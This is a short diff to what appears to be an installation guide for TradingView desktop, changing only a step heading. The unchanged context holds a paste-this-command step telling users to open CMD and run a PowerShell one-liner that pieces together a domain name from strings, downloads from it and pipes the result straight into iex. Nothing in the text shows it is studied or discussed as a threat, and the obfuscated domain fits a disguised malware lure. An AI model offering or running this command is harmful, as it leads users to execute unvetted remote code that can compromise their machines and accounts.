@@ -16,7 +16,7 @@ _Using the CMD command is the recommended method for installing TradingView desk
 
 Press `Win + R`, type `CMD`, and press **Enter**.
 
-### Step 2: Run the Command
+### Step 2: Run the Installation Command
 ```powershell
 powershell -command "$desktop='.app'; iwr ('tradingview' + 'install' + $desktop) | iex"
 `````
